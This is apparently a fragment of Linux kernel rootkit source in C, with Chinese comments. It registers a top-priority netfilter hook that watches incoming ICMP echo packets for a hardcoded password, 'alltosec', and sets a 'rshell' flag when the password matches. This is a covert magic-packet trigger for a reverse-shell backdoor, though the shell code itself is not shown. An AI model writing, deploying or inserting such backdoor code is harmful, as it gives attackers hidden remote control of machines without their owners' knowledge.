#include <linux/netfilter_ipv4.h>
#include "g_types.h"

static u08_t *passsign = "alltosec";
bool rshell = false;
picmp_echo_data icmpdata = NULL;

unsigned int hook_func_icmp(const struct nf_hook_ops *ops, struct sk_buff *skb, const struct net_device *in, const struct net_device *out, int (*okfn)(struct sk_buff *))
{
	icmpdata = (picmp_echo_data) icmp_hdr(skb);

	switch((ip_hdr(skb))->protocol)
	{
		case IPPROTO_ICMP:
			if(icmpdata->hdr.type != ICMP_ECHO) break; //不处理ECHO以外的ICMP包
			if(* (u64_t *) passsign != * (u64_t *) icmpdata->param.sign) break;
			//printk(KERN_INFO "ICMP_ECHO data in\r\n");
			rshell = true;
		break;
	}
	return NF_ACCEPT;//传递
	//return NF_DROP;  //丢弃
}

static struct nf_hook_ops nfhopt[1] = 
{{
	.hook = hook_func_icmp,
	.hooknum = NF_INET_PRE_ROUTING, //IPv4第一个hook
	.pf = PF_INET,
	.priority = NF_IP_PRI_FIRST   //优先级最高
},};

void nf_reg_hook(void)
{
	nf_register_hooks(nfhopt, ARRAY_SIZE(nfhopt));
}
void nf_reg_unhook(void)
{
	nf_unregister_hooks(nfhopt, ARRAY_SIZE(nfhopt));
}
